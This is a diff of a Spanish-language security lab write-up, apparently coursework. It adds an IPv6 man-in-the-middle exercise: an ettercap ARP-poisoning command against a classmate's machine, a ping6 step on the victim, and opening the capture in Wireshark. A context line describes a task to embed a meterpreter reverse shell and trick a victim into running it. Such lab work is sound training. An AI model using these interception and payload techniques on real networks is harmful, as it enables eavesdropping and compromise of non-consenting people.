@@ -148,12 +148,31 @@ Statistics > HTTP > Requests:
 ***g) Instale metasploit. Haga un ejecutable que incluya un Reverse TCP meterpreter payload para plataformas linux. Inclúyalo en un filtro ettercap y aplique toda su sabiduría en ingeniería social para que una víctima u objetivo lo ejecute.***
 
 
+***h) Haga un MITM en IPv6 y visualice la paquetería.***
 
+Mi IPv6 es () -> 10.11.48.207
+La de mi compañero es () -> 10.11.48.203
 
+**- ATACANTE:**
 
+Creamos antes el archivo en /var/log/MITMIPv6
 
+```
+ettercap -i ens33 -P repoison_arp -T -M arp:remote /Ip_Alex/Ipv6_Alex/ /10.11.48.1// -w /var/log/MITMIPv6
+```
+**- VICTIMA:**
 
+En la víctima únicamente hacemos 
 
+```
+ping6 -c2 -I ens33 ff02::1
+```
+El archivo generado lo abrimos en wireshark 
+
+-> wireshark > Archivo > Abrir >
+/var/log/MITMIPv6
+
+En el archivo hay que localizar la MAC de la víctima.
 
 
 
